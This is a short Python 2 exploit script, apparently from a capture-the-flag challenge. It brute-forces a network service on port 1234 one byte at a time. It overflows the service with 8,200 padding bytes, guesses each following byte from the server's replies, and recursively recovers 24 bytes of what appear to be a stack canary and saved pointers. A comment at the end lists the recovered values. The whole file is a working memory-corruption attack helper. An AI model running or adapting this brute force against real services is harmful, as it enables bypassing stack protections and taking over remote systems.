#!/usr/bin/env python2
#-*- coding:utf-8 -*-

import os, sys, socket
from zio import *

host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'

def check(guess):
    while True:
        io = None
        try:
            io = zio((host, 1234), print_write = False, print_read = False, timeout = 2)
            io.write(guess)
            s = io.read()
            if s.find('We received %d bytes' % len(guess)) > -1:
                return s.find('data saved, we will process this later') > -1
        except TIMEOUT:
            s = io.before
            if s.find('We received %d bytes' % len(guess)) > -1:
                return s.find('data saved, we will process this later') > -1
        except KeyboardInterrupt:
            raise
        except BaseException, ex:
            print ex
        finally:
            io.close(force = True)

prefix = 'A' * (8200)

def search(current):
    if len(current) == 8 * 3:
        return [current]
    candidate = []
    for j in range(256):
        print repr(current), ' + ', repr(chr(j)),
        if check(prefix + current + chr(j)):
            candidate.append(j)
            print '[ OK ]'
        else:
            print '[ FAIL ]'
    ret = []
    for i in candidate:
        ret += search(current + chr(i))
    return ret

ans = search('')
print '-' * 50
for i in ans:
    print repr(i)

# result is '\x000\x03\x99\xa2\x83D?\xa0\xf2\xde\x93\xff\x7f\x00\x00\x15\x1e\xf2_\r\x7f\x00\x00'
